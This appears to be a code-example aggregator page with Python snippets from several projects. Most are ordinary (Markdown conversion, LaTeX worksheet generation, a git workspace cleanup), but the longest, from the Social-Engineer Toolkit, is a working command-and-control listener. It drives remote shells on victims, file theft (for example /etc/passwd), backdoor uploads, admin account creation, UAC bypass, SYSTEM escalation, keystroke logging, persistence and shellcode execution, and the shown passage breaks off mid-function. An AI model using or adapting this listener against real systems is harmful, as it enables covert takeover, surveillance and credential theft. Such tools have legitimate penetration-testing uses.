        for s in opts.extras:
            extras.update( re.compile("[,;: ]+").split(s) )
    else:
        extras = None

    if opts.link_patterns_file:
        link_patterns = []
        f = open(opts.link_patterns_file)
        try:
            for i, line in enumerate(f.readlines()):
                if not line.strip(): continue
                if line.lstrip().startswith("#"): continue
                try:
                    pat, href = line.rstrip().rsplit(None, 1)
                except ValueError:
                    raise MarkdownError("%s:%d: invalid link pattern line: %r"
                                        % (opts.link_patterns_file, i+1, line))
                link_patterns.append(
                    (_regex_from_encoded_pattern(pat), href))
        finally:
            f.close()
    else:
        link_patterns = None

    from os.path import join, dirname
    markdown_pl = join(dirname(__file__), "test", "Markdown.pl")
    for path in paths:
        if opts.compare:
            print "-- Markdown.pl"
            os.system('perl %s "%s"' % (markdown_pl, path))
            print "-- markdown2.py"
        html = markdown_path(path, encoding=opts.encoding,
                             html4tags=opts.html4tags,
                             safe_mode=opts.safe_mode,
                             extras=extras, link_patterns=link_patterns,
                             use_file_vars=opts.use_file_vars)
        sys.stdout.write(
            html.encode(sys.stdout.encoding or "utf-8", 'xmlcharrefreplace'))


 
Example 51
From project pyromaths-master, under directory src/pyromaths/outils, in source file System.py.
Score: 5
vote
vote
def creation(parametres):
    """Création et compilation des fiches d'exercices.
    parametres = {'fiche_exo': f0,
                  'fiche_cor': f1,
                  'liste_exos': self.lesexos,
                  'creer_pdf': self.checkBox_create_pdf.checkState(),
                  'creer_unpdf': self.checkBox_unpdf.isChecked() and self.checkBox_unpdf.isEnabled(),
                  'titre': unicode(self.lineEdit_titre.text()),
                  'niveau': unicode(self.comboBox_niveau.currentText()),
                }"""
    exo = unicode(parametres['fiche_exo'])
    cor = unicode(parametres['fiche_cor'])
    f0 = codecs.open(exo, encoding='utf-8', mode='w')
    f1 = codecs.open(cor, encoding='utf-8', mode='w')

    if parametres['creer_pdf']:
        copie_tronq_modele(f0, parametres, 'entete')
        if not parametres['creer_unpdf']:
            copie_tronq_modele(f1, parametres, 'entete')

    for exercice in parametres['liste_exos']:
        # write exercise's TeX code (question & answer) to files
        f0.write("\n")
        f0.writelines(line + "\n" for line in exercice.tex_statement())
        f1.write("\n")
        f1.writelines(line + "\n" for line in exercice.tex_answer())


    if parametres['creer_pdf']:
        if parametres['creer_unpdf']:
            f0.write("\\label{LastPage}\n")
            f0.write("\\newpage\n")
            f0.write(u"\\currentpdfbookmark{Le corrigé des exercices}{Corrigé}\n")
            f0.write("\\lhead{\\textsl{{\\footnotesize Page \\thepage/ \\pageref{LastCorPage}}}}\n")
            f0.write("\\setcounter{page}{1} ")
            f0.write("\\setcounter{exo}{0}\n")
            f1.write("\\label{LastCorPage}\n")
            copie_tronq_modele(f1, parametres, 'pied')
        else:
            f0.write("\\label{LastPage}\n")
            f1.write("\\label{LastPage}\n")
            copie_tronq_modele(f0, parametres, 'pied')
            copie_tronq_modele(f1, parametres, 'pied')

    f0.close()
    f1.close()

    if parametres['creer_unpdf']:
        f0 = codecs.open(exo, encoding='utf-8', mode='a')
        f1 = codecs.open(cor, encoding='utf-8', mode='r')
        for line in f1:
            f0.write(line)
        f0.close()
        f1.close()

    # indentation des fichiers teX créés
    mise_en_forme(exo)
    if parametres['corrige'] and not parametres['creer_unpdf']:
        mise_en_forme(cor)

    # Dossiers et fichiers d'enregistrement, définitions qui doivent rester avant le if suivant.
    dir0 = os.path.dirname(exo)
    dir1 = os.path.dirname(cor)
    import socket
    if socket.gethostname() == "sd-27355.pyromaths.org":
        # Chemin complet pour Pyromaths en ligne car pas d'accents
        f0noext = os.path.splitext(exo)[0].encode(sys.getfilesystemencoding())
        f1noext = os.path.splitext(cor)[0].encode(sys.getfilesystemencoding())
    else:
        # Pas le chemin pour les autres, au cas où il y aurait un accent dans
        # le chemin (latex ne gère pas le 8 bits)
        f0noext = os.path.splitext(os.path.basename(exo))[0].encode(sys.getfilesystemencoding())
        f1noext = os.path.splitext(os.path.basename(cor))[0].encode(sys.getfilesystemencoding())
    if parametres['creer_pdf']:
        from subprocess import call

        os.chdir(dir0)
        latexmkrc = open('latexmkrc', 'w')
        latexmkrc.write('sub asy {return system("asy \'$_[0]\'");}')
        latexmkrc.write('add_cus_dep("asy","eps",0,"asy");')
        latexmkrc.write('add_cus_dep("asy","pdf",0,"asy");')
        latexmkrc.write('add_cus_dep("asy","tex",0,"asy");')
        latexmkrc.write('@generated_exts = qw(pre dvi ps auxlock");')
        latexmkrc.write('$clean_ext = "%s-figure* %s-?.asy %s-?_0.eps %s-?.tex %s-??.asy %s-??_0.eps %s-??.tex %s.auxlock %s.fdb_latexmk %s.fls %s-*.pre %s.pre";' % tuple([f0noext] * 12))
        latexmkrc.write('sub cleanup1 {')
        latexmkrc.write('  my $dir = fix_pattern( shift );')
        latexmkrc.write('  foreach (@_) {')
        latexmkrc.write('    (my $name = (/%%R/ || /[\*\.\?]/) ? $_ : "%%R.$_") =~ s/%%R/$dir$root_filename/;')
        latexmkrc.write('    unlink_or_move( glob( "$name" ) );')
        latexmkrc.write('  }\n}')
        latexmkrc.close()
        log = open('%s-pyromaths.log' % f0noext, 'w')
        if socket.gethostname() == "sd-27355.pyromaths.org":
            os.environ['PATH'] += os.pathsep + "/usr/local/texlive/2014/bin/x86_64-linux"
            call(["latexmk", "-shell-escape", "-silent", "-interaction=nonstopmode", "-output-directory=%s" % dir0, "-pdfps", "%s.tex" % f0noext], env=os.environ, stdout=log)
            call(["latexmk", "-c", "-silent", "-output-directory=%s" % dir0], env=os.environ, stdout=log)
        elif os.name == 'nt':
            call(["latexmk", "-pdfps", "-shell-escape", "-silent", "-interaction=nonstopmode", "%s.tex" % f0noext], env={"PATH": os.environ['PATH'], "WINDIR": os.environ['WINDIR'], 'USERPROFILE': os.environ['USERPROFILE']}, stdout=log)
            call(["latexmk", "-silent", "-c"], env={"PATH": os.environ['PATH'], "WINDIR": os.environ['WINDIR'], 'USERPROFILE': os.environ['USERPROFILE']}, stdout=log)
        else:
            call(["latexmk", "-pdfps", "-shell-escape", "-silent", "-interaction=nonstopmode", "%s.tex" % f0noext], stdout=log)
            call(["latexmk", "-silent", "-c"], stdout=log)
        log.close()
        nettoyage(f0noext)
        if not "openpdf" in parametres or parametres["openpdf"]:
            if os.name == "nt":  # Cas de Windows.
                os.startfile('%s.pdf' % f0noext)
            elif sys.platform == "darwin":  # Cas de Mac OS X.
                os.system('open %s.pdf' % f0noext)
            else:
                os.system('xdg-open %s.pdf' % f0noext)

        if parametres['corrige'] and not parametres['creer_unpdf']:
            os.chdir(dir1)
            log = open('%s-pyromaths.log' % f1noext, 'w')
            for dummy in range(2):
                call(["latex", "-interaction=batchmode", "%s.tex" % f1noext], stdout=log)
            call(["dvips", "-q", "%s.dvi" % f1noext, "-o%s.ps" % f1noext], stdout=log)
            call(["ps2pdf", "-sPAPERSIZE#a4", "%s.ps" % f1noext, "%s.pdf" % f1noext], stdout=log)
            log.close()
            nettoyage(f1noext)
            if not "openpdf" in parametres or parametres["openpdf"]:
                if os.name == "nt":  # Cas de Windows.
                    os.startfile('%s.pdf' % f1noext)
                elif sys.platform == "darwin":  # Cas de Mac OS X.
                    os.system('open %s.pdf' % f1noext)
                else:
                    os.system('xdg-open %s.pdf' % f1noext)
        else:
            os.remove('%s-corrige.tex' % f0noext)

 
Example 52
From project cocos2d-x, under directory tools/jenkins-scripts/configs, in source file cocos-2dx-pull-request-build.py.
Score: 5
vote
vote
def clean_workspace():
  os.system('git reset --hard')
  os.system('git clean -xdf -f')

 
Example 53
From project social-engineer-toolkit, under directory src/payloads/set_payloads, in source file listener.py.
Score: 5
vote
vote
def start_listener():

    # grab the operating system
    operating_system = check_os()
    # try to import readline, if not, disable tab completion
    tab_complete = True
    try:
        import readline
    # handle exception if readline isn't imported
    except ImportError:
        print "[!] python-readline is not installed, tab completion will be disabled."
        # turn tab_complete to false and disable it
        tab_complete = False

    # specify we are using core module, need to clean this up and remove later
    core_module = True

    # allow readline tab completion
    if tab_complete == True:
        readline.parse_and_bind("tab: complete")

    HOST = '' # bind to all interfaces

    # try command line arguments first
    try:
        PORT = int(sys.argv[1])

    # handle index error
    except IndexError:
        if check_options("PORT=") != 0:
            PORT = check_options("PORT=")

        else:
            # port number prompt for SET listener
            PORT = raw_input(setprompt("0", "Port to listen on [443]"))
            if PORT == "":
                # if null then default to port 443
                print "[*] Defaulting to port 443 for the listener."
                PORT = 443
                update_config("PORT=443")

        try:
            # make the port an integer
            PORT = int(PORT)
        except ValueError:
            while 1:
                print_warning("Needs to be a port number!")
                PORT = raw_input(setprompt("0", "Port to listen on: "))
                if PORT == "":
                    PORT = 443
                    break
                try:
                    PORT = int(PORT)
                    break
                except ValueError:
                    PORT = 443
                    break

    # log error messages
    def log(error):
        # check to see if path is here
        if os.path.isfile("src/logs/"):
            # grab the date and time for now
            now=datetime.datetime.today()
            # all error messages will be posted in set_logfile.txt
            filewrite=file("src/logs/set_logfile.log", "a")
            filewrite.write(now + error + "\r\n")
            filewrite.close()

    # specify it as nothing until we make it past our encryption check
    try:

        from Crypto.Cipher import AES

        # set encryption key to 1
        encryption = 1

        print_status("Crypto.Cipher library is installed. AES will be used for socket communication.")
        print_status("All communications will leverage AES 256 and randomized cipher-key exchange.")
        # the block size for the cipher object; must be 16, 24, or 32 for AES
        BLOCK_SIZE = 32

        # the character used for padding--with a block cipher such as AES, the value
        # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
        # used to ensure that your value is always a multiple of BLOCK_SIZE
        PADDING = '{'

        # one-liner to sufficiently pad the text to be encrypted
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

        # one-liners to encrypt/encode and decrypt/decode a string
        # encrypt with AES, encode with base64
        EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
        DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

        # generate a random secret key
        secret = os.urandom(BLOCK_SIZE)

        # create a cipher object using the random secret
        cipher = AES.new(secret)

    # if it isn't import then trigger error and turn off encryption
    except ImportError:
        # this means that python-crypto is not installed and we need to set the encryption flag to 0, which turns off communications
        encryption = 0
        print_warning("Crypto.Cipher python module not detected. Disabling encryption.")
        if operating_system != "windows":
            print_warning("If you want encrypted communications download from here: http://ftp.dlitz.net/pub/dlitz/crypto/pycrypto/pycrypto-2.3.tar.gz")
            print_warning("Or if your on Ubuntu head over to: http://packages.ubuntu.com/search?keywords=python-crypto")
            print_warning("Or you can simply type apt-get install python-crypto or in Back|Track apt-get install python2.5-crypto")

    # universal exit message
    def exit_menu():
        print "\n[*] Exiting the Social-Engineer Toolkit (SET) Interactive Shell."

    mysock = socket.socket(AF_INET, SOCK_STREAM)
    mysock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    addr = (HOST,PORT)
    try:
        mysock.bind(addr)
        mysock.listen(100000)
    except Exception, error:
        if core_modules == True:
            log(error)
            print_error("ERROR:Unable to bind to listener port, do you have something else listening?")
            sys.exit() #exit_set()
        if core_modules == False: sys.exit("[!] Unable to bind to interfact. Try again.")

    # base count handler
    count = 0

    # send packet is used to determine if encryption is in use or not
    def send_packet(message,conn,encryption):

        # we put a try/except block here in case of socket error. if it has an exception
        # here, it would completely kill the session. we want to make it as stable as possible even
        # after error.
        try:

            # if encryption is enabled then send this
            if encryption == 1:

                # we encrypt our output here
                encoded = EncodeAES(cipher, message)
                # we take the length of the encrypted string
                normal_size = len(encoded)
                # we turn the length of our string into a string literal
                normal_size = str(normal_size)
                # we encrypt our string literal
                normal_size_crypt= EncodeAES(cipher, normal_size)
                # we send our encrypted string literal to let our server know h$
                # true encrypted string is
                conn.send(str(normal_size_crypt))
                time.sleep(0.3)
                # we send our encrypted string
                conn.send(str(encoded))

            # if encryption is disabled then send this
            if encryption == 0:
                message_size = str(len(message))
                conn.send(message_size)
                conn.send(str(message))

        # handle exceptions
        except Exception, e:
            print_warning("An exception occured. Handling it and keeping session alive. Error: " + str(e))
            pass

    # decrypt received packets
    def decrypt_packet(message,encryption):
        # try/except block to keep socket alive
        try:

            # if encrypt then decode
            if encryption == 1:
                return DecodeAES(cipher, message)

            # if not encrypted then return result
            if encryption == 0:
                return message

        # handle exceptions
        except Exception, e:
            print_warning("An exception occured. Handling it and keeping session alive. Error: " + str(e))
            pass

    # handle tab completion here for set interactive menu
    class Completer:
        def __init__(self):
            if operating_system == "windows":
                self.words = ["shell","localadmin", "help", "?", "domainadmin", "ssh_tunnel", "bypassuac", "lockworkstation", "grabsystem", "download", "upload", "ps", "kill", "keystroke_start", "keystroke_dump", "reboot", "persistence", "removepersistence", "shellcode", "cls", "clear"]
            if operating_system == "posix":
                self.words = ["shell", "help", "?", "ssh_tunnel", "download", "upload", "reboot", "cls", "clear"]
            self.prefix = None

        def complete(self, prefix, index):
            if prefix != self.prefix:
                self.matching_words = [w for w in self.words if w.startswith(prefix)]
                self.prefix = prefix
            else:
                pass
            try:
                return self.matching_words[index]
            except IndexError:
                return None

    # handle tab completion here for initial choice selection
    class Completer2:
        def __init__(self):
            self.words = []
            self.prefix = None

        def complete(self, prefix, index):
            if prefix != self.prefix:
                self.matching_words = [w for w in self.words if w.startswith(prefix)]
                self.prefix = prefix
            else:
                pass
            try:
                return self.matching_words[index]
            except IndexError:
                return None


    # main socket handler
    def handle_connection(conn,addr,encryption,operating_system):

        print_status("Dropping into the Social-Engineer Toolkit Interactive Shell.")

        # put an exceptions block in here
        try:

            # if we are leveraging encryption
            if encryption == 1:
                # generate a random 52 character string
                random_string = os.urandom(52)
                data=conn.send(random_string)
                # confirm that we support encryption
                data = conn.recv(1024)
                if data == random_string:
                    # This method isn't probably the most desirable since it can
                    # be intercepted and unhex'd during transmission. Provides a
                    # good level of encryption unless the ciphertext is used as the
                    # AES decryption string. This is a first pass, will improve over
                    # time. Could hardcode keys on server/client but would have an
                    # even less desirable effect. Overall, solution will be to use
                    # pub/private RSA certs
                    secret_send = binascii.hexlify(secret)
                    conn.send(secret_send)

                # if we didn't receive the confirmation back then we don't support encryption
   
                else : encryption = 0

            # if we aren't using encryption then tell the victim
            if encryption == 0:
                # generate a random 51 character string
                random_string = os.urandom(51)
                conn.send(random_string)
                # acknowledge encryption has been disabled
                data = conn.recv(51)
                # decrypt the data if applicable
                data=decrypt_packet(data,encryption)

        except Exception, e:
            print e
            print_warning("Looks like the session died. Dropping back into selection menu.")
            return_continue()
            global count
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))
            sys.exit() #exit_set()

        # initial try loop to catch keyboard interrupts and exceptions
        try:

            # start initial loop for menu
            while 1:
                # main SET menu
                if tab_complete == True:
                    completer = Completer()
                    readline.set_completer(completer.complete)
                data=raw_input(setprompt(["25"], ""))

                # if data is equal to quit or exit then break out of loop and exit
                if data == "quit" or data == "exit" or data == "back":
                    print_warning("Dropping back to list of victims.\n")
                    send_packet("quit", conn, encryption)
                    break

                if data == "cls" or data == "clear":
                    os.system("clear")

                # if user specifies help do this
                if data == "help" or data == "?":

                    print "Welcome to the Social-Engineer Toolkit Help Menu.\n\nEnter the following commands for usage:"

                    # universal commands
                    if operating_system == "posix" or operating_system == "windows":
                        print """
Command: shell
Explanation: drop into a command shell
Example: shell

Command: download <path_to_file>
Explanation: downloads a file locally to the SET root directory.
Example: download C:\\boot.ini or download /etc/passwd

Command: upload <path_to_file_on_attacker> <path_to_write_on_victim>
Explanation: uploads a file to the victim system
Example: upload /root/nc.exe C:\\nc.exe or upload /root/backdoor.sh /root/backdoor.sh

Command: ssh_tunnel <attack_ip> <attack_ssh_port> <attack_tunnelport> <user> <pass> <tunnel_port>
Explanation: This module tunnels ports from the compromised victims machine back to your machine.
Example: ssh_tunnel publicipaddress 22 80 root complexpassword?! 80

Command: exec <command>
Explanation: Execute a command on your LOCAL 'attacker' machine.
Example exec ls -al

Command: ps
Explanation: List running processes on the victim machine.
Example: ps

Command: kill <pid>
Explanation: Kill a process based on process ID (number) returned from ps.
Example: kill 3143

Command: reboot now
Explanation: Reboots the remote server instantly.
Example: reboot now"""
                    # if we're running under windows
                    if operating_system == "windows":
                        print """
Command: localadmin <username> <password>
Explanation: adds a local admin to the system
Example: localadmin bob p@55w0rd!

Command: domainadmin <username> <password>
Explanation: adds a local admin to the system
Example: domainadmin bob p@55w0rd!

Command: bypassuac <ipaddress_of_listener> <port_of_listener> <x86 or x64>
Explanation: Trigger another SET interactive shell with the UAC safe flag
Example bypassuac 172.16.32.128 443 x64

Command: grabsystem <ipaddress_of_listener> <port_of_listener>
Explanation: Uploads a new set interactive shell running as a service and as SYSTEM.
Caution: If using on Windows 7 with UAC enabled, run bypassuac first before running this.
Example: grabsystem 172.16.32.128 443

Command: keystroke_start
Explanation: Starts a keystroke logger on the victim machine. It will stop when shell exits.
Example: keystroke_start

Command: keystroke_dump
Explanation: Dumps the information from the keystroke logger. You must run keystroke_start first.
Example: keystroke_dump

Command: lockworkstation
Explanation: Will lock the victims workstation forcing them to log back in. Useful for capturing keystrokes.
Example: lockworkstation

Command: persistence <ipaddress_of_listener> <port_of_listener>
Explanation: Persistence will spawn a SET interactive shell every 30 minutes on the victim machine.
Example: persistence 172.16.32.128 443
Warning: Will not work with UAC enabled *yet*.

Command: removepersistence
Explanation: Will remove persistence from the remote victim machine.
Example: removepersistence

Command: shellcode
Explanation: This will execute native shellcode on the victim machine through python.
Example: shellcode <enter> - Then paste your shellcode \x41\x41\etc
"""
                try:
                    # base counter to see if command is invalid
                    base_counter = 0

                    # do a quick search to execute a local command
                    match=re.search("exec", data)
                    if match:

                        # trigger we hit
                        base_counter = 1

                        # define temp_data to test if we have more than one command other than exec
                        temp_data = data.split(" ")

                        # remove the exec name from the command
                        data = data.replace("exec ", "")
                        # grab the command
                        command = data
                        # assign data to exec for handler below
                        data = "exec"

                        # see if we have a value, if not through an indexerror
                        data = "exec test"
                        data = data.split(" ")
                        temp_data = temp_data[1]
                        data = "exec"

                    # split into tuple in case localadmin is used

                    data=data.split(" ")
                    # if data[0] is localadmin then split up the creds and data
                    if data[0] == "localadmin":
                        creds="%s,%s" % (data[1],data[2])
                        data="localadmin"
                        base_counter = 1


                    # if data[0] is domainadmin then split up the creds and data
                    if data[0] == "domainadmin":
                        creds="%s,%s" % (data[1],data[2])
                        data="domainadmin"
                        base_counter = 1

                    # if data[0] is equal to shell then go to normal
                    if data[0] == "shell":
                        base_counter = 1
                        data = data[0]

                    # if data[0] is equal to download
                    if data[0] == "download":
                        # assign download_path
                        download_path=data[1]
                        # assign data[0]
                        data = data[0]
                        base_counter = 1

                    # if data[0] is equal to ssh_port_forward then use port forwarding
                    if data[0] == "ssh_tunnel":
                        # IP of the SSH server
                        ssh_server_ip = data[1]
                        # PORT of the SSH server
                        ssh_server_port_address = data[2]
                        # PORT to use on localhost for tunneled protcol
                        ssh_server_tunnel_port = data[3]
                        # username for SSH server
                        ssh_server_username = data[4]
                        # password for SSH server
                        ssh_server_password = data[5]
                        # PORT to forward from victim
                        victim_server_port = data[6]
                        # specify data as ssh_port_tunnel
                        data = data[0]
                        base_counter=1

                    # if data[0] is equal to upload_file
                    if data[0] == "upload":
                        # assign executable path to upload
                        upload = data[1]
                        # assign path to write file on opposite side
                        write_path = data[2]
                        # assign data[0]
                        data = data[0]
                        base_counter = 1

                    # bypassuac
                    if data[0] == "bypassuac":
                        # ipaddress and port
                        ipaddress = data[1] + " " + data[2]
                        exe_platform = data[3]
                        data = data[0]
                        base_counter = 1

                    # persistence
                    if data[0] == "persistence":
                        ipaddress = data[1] + " " + data[2]
                        data = data[0]
                        base_counter = 1

                    if data[0] == "removepersistence":
                        base_counter = 1
                        data = data[0]

                    if data[0] == "keystroke_start":
                        data = "keystroke_start"
                        base_counter = 1

                    if data[0] == "keystroke_dump":
                        data = "keystroke_dump"
                        base_counter = 1

                    # grabsystem
                    if data[0] == "grabsystem":
                        # define ipaddress
                        ipaddress = data[1] + " " + data[2]
                        data = data[0]
                        base_counter = 1

                    # lock workstation
                    if data[0] == "lockworkstation":
                        data = "lockworkstation"
                        base_counter = 1

                    # if data[0] is equal to ps
                    if data[0] == "ps":
                        data = "ps"
                        base_counter = 1

                    # if data[0] is equal to reboot
                    if data[0] == "reboot":
                        if data[1] == "now":
                            data = "reboot now"
                            base_counter = 1

                    # if data[0] is equal kill
                    if data[0] == "kill":
                        pid_number = data[1]
                        data = "kill"
                        base_counter = 1

                    # if data[0] is equal to exec
                    if data[0] == "exec":
                        data = "exec"
                        base_counter = 1

                    # shellcodeexec
                    if data[0] == "shellcode":
                        shellcode_inject = raw_input("Paste your shellcode into here: ")
                        shellcode_inject = shellcode_inject.decode("string_escape")
                        data = "shellcode"
                        base_counter = 1

                    if data[0] == "help" or data[0] == "?": base_counter = 1

                    if data[0] == "": base_counter = 1
                    if data[0] == "cls" or data[0] == "clear": base_counter = 1

                    if base_counter == 0: print "[!] The command was not recognized."


                # handle range errors and throw correct syntax
                except IndexError:
                    if data[0] == "kill": print "[!] Usage: kill <pid_id>"
                    if data[0] == "exec": print "[!] Usage: exec <command>"
                    if data[0] == "bypassuac": print "[!] Usage: bypassuac <set_reverse_listener_ip> <set_port> <x64 or x86>"
                    if data[0] == "upload": print "[!] Usage: upload <filename> <path_on_victim>"
                    if data[0] == "download": print "[!] Usage: download <filename>"
                    if data[0] == "ssh_tunnel": print "[!] Usage: ssh_tunnel <attack_ip> <attack_ssh_port> <attack_tunnelport> <user> <pass> <tunnel_port>"
                    if data[0] == "domainadmin": print "[!] Usage: domainadmin <username> <password>"
                    if data[0] == "localadmin": print "[!] Usage: localadmin <username> <password>"
                    if data[0] == "grabsystem": print "[!] Usage: grabsystem <ipaddress_of_listener> <port_of_listener>"
                    if data[0] == "reboot": print "[!] Usage: reboot now"
                    if data[0] == "persistence": print "[!] Usage: persistence <set_reverse_listener_ip> <set_port>"
                    if data[0] == "shellcode": print "[!] Usage: shellcode <paste shellcode>"

                # in case of an attribute error just pass and restart
                except AttributeError,e:
                        # write to log file then pass
                    log(e)
                    pass

                # handle the rest of errors
                except Exception, e:
                    print "[!] Something went wrong, printing error: " + str(e)
                    log(e)
                    garbage1 = ""
                    garbage2 = ""
                    garbage3 = ""
                    thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))
                    sys.exit()

                # if data is equal to shell
                if data == "shell":
                    send_packet(data, conn, encryption)
                    print "[*] Entering a Windows Command Prompt. Enter your commands below.\n"
                    while 1:
                        try:
                            # accept raw input
                            data=raw_input(setprompt(["25", "26"], ""))
                            # if we specify exit or quit then get out
                            if data == "exit" or data == "quit" or data == "back":
                                print "[*] Dropping back to interactive shell... "
                                send_packet(data, conn, encryption)
                                break
                            if data != "":
                                send_packet(data, conn, encryption)

                                # this will receive length of data socket we need
                                data = conn.recv(1024)
                                # decrypt the data length
                                data=decrypt_packet(data,encryption)

                                # here is an ugly hack but it works, basically we set two
                                # counters. MSGLEN which will eventually equal the length
                                # of what number was sent to us which represented the length
                                # of the output of the shell command we executed. Dataout
                                # will eventually equal the entire string loaded into our
                                # buffer then sent for decryption.
                                #
                                # A loop is started which continues to receive until we hit
                                # the length of what our entire full encrypted shell output
                                # is equaled. Once that occurs, we are out of our loop and
                                # the full string is sent to the decryption routine and
                                # presented back to us.

                                MSGLEN = 0
                                dataout = ""
                                length = int(data)
                                while 1:
                                    data = conn.recv(1024)
                                    if not data: break
                                    dataout += data
                                    MSGLEN = MSGLEN + len(data)
                                    if MSGLEN == int(length): break

                                # decrypt our command line output
                                data = decrypt_packet(dataout,encryption)
                                # display our output
                                print data

                        # handle error generally means base 10 error message which means there
                        # was no response. Socket probably died somehow.
                        except ValueError, e:
                            # write to log file
                            log(e)
                            print "[!] Response back wasn't expected. The session probably died."
                            garbage1 = ""
                            garbage2 = ""
                            garbage3 = ""
                            thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))
                            sys.exit() #exit_set()

                # if data is equal to localadmin then flag and add a local user account
                if data == "localadmin":
                    print "[*] Attempting to add a user account with administrative permissions."
                    send_packet(data, conn, encryption)
                    send_packet(creds, conn, encryption)
                    print "[*] User add completed. Check the system to ensure it worked correctly."

                # if data is equal to domainadmin then flag and add a local admin account
                if data == "domainadmin":
                    print "[*] Attempting to add a user account with domain administrative permissions."
                    send_packet(data, conn, encryption)
                    send_packet(creds, conn, encryption)
                    print "[*] User add completed. Check the system to ensure it worked correctly."

                # keystroke logger
                if data == "keystroke_start":
                    send_packet(data, conn, encryption)
                    print "[*] Keystroke logger has been started on the victim machine"

                # dump the data
                if data == "keystroke_dump":
                    send_packet(data, conn, encryption)
                    data = conn.recv(1024)
                    data=decrypt_packet(data,encryption)
                    data = conn.recv(int(data))
                    data=decrypt_packet(data,encryption)
                    print data

                # if data is equal to download
                if data == "download":

                    # trigger our shell to go in downloadfile mode
                    data = "downloadfile"

                    # send that we are in downloadfile mode
                    send_packet(data, conn, encryption)

                    # send our file path
                    send_packet(download_path, conn, encryption)

                    # mark a flag for write
                    download_path = download_path.replace("\\", "_")
                    download_path = download_path.replace("/", "_")
                    download_path = download_path.replace(":", "_")
                    filewrite = file(download_path, "wb")

                    # start a loop until we are finished getting data

                    # recv data
                    data = conn.recv(1024)
                    data=decrypt_packet(data,encryption)

                    # here is an ugly hack but it works, basically we set two
                    # counters. MSGLEN which will eventually equal the length
                    # of what number was sent to us which represented the length
                    # of the output of the file.
                    # Dataout will eventually equal the entire string loaded into our
                    # buffer then sent for decryption.
                    #
                    # A loop is started which continues to receive until we hit
                    # the length of what our entire full encrypted file output
                    # is equaled. Once that occurs, we are out of our loop and
                    # the full string is sent to the decryption routine and
                    # presented back to us.

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)


                    data = decrypt_packet(data,encryption)

                    # if the file wasn't right
                    if data == "File not found.":
                        print "[!] Filename was not found. Try again."
                        break

                    if data != "File not found.":
                        # write the data to file
                        filewrite.write(data)
                        filewrite.close()
                        # grab our current path
                        definepath=os.getcwd()
                        print "[*] Filename: %s successfully downloaded." % (download_path)
                        print "[*] File stored at: %s/%s" % (definepath,download_path)


                # lock workstation
                if data == "lockworkstation":
                    print "[*] Sending the instruction to lock the victims workstation..."
                    send_packet(data, conn, encryption)
                    print "[*] Victims workstation has been locked..."

                # grabsystem
                if data == "grabsystem":

                    data = "getsystem"

                    # send that we want to upload a file to the victim controller
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)

                    write_path= "not needed"

                    send_packet(write_path, conn, encryption)

                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                        upload = "src/payloads/set_payloads/shell.windows"

                    if os.path.isfile("shell.windows"):
                        upload = "shell.windows"

                    if os.path.isfile(upload):
                        fileopen = file(upload, "rb")

                        print "[*] Attempting to upload interactive shell to victim machine."

                        # open file for reading
                        data_file = fileopen.read()
                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data,encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data,encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print "[*] SET Interactive shell successfully uploaded to victim."

                        # if we failed
                        if data == "Failed":
                            print "[!] File had an issue saving to the victim machine. Try Again?"

                    # delay 5 seconds
                    time.sleep(0.5)

                    # write out system
                    if os.path.isfile("%s/system.address" % (setdir)):
                        os.remove("%s/system.address" % (setdir))
                    filewrite = file("%s/system.address" % (setdir), "w")
                    filewrite.write(addr)
                    filewrite.close()


                    # send the ipaddress and port for reverse connect back
                    send_packet(ipaddress, conn, encryption)

                    print "[*] You should have a new shell spawned that is running as SYSTEM in a few seconds..."

                # bypassuac
                if data == "bypassuac":

                    # define uac string

                    # had to do some funky stuff here because global vars are not working properly
                    # inside threads, so the information cant be passed to normal outside routines
                    if os.path.isfile(setdir + "/uac.address"):
                        os.remove(setdir + "/uac.address")
                    filewrite = file(setdir + "/uac.address", "w")
                    filewrite.write(addr)
                    filewrite.close()

                    # send that we want to upload a file to the victim controller
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)

                    # now that we're inside that loop on victim we need to give it parameters
                    # we will send the write_path to the victim to prep the filewrite

                    write_path= "not needed"

                    # send packet over
                    send_packet(write_path, conn, encryption)

                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if exe_platform == "x64":
                        if os.path.isfile("src/payloads/set_payloads/uac_bypass/x64.binary"):
                            upload = "src/payloads/set_payloads/uac_bypass/x64.binary"

                        if os.path.isfile("uac_bypass/x64.binary"):
                            upload = "uac_bypass/x64.binary"

                    if exe_platform == "x86":
                        if os.path.isfile("src/payloads/set_payloads/uac_bypass/x86.binary"):
                            upload = "src/payloads/set_payloads/uac_bypass/x86.binary"
                        if os.path.isfile("uac_bypass/x86.binary"):
                            upload = "uac_bypass/x86.binary"

                    if os.path.isfile(upload):
                        fileopen = file(upload, "rb")

                        print "[*] Attempting to upload UAC bypass to the victim machine."
                        # start a loop
                        data_file = fileopen.read()
                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data,encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data,encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print "[*] Initial bypass has been uploaded to victim successfully."

                        # if we failed
                        if data == "Failed":
                            print "[!] File had an issue saving to the victim machine. Try Again?"

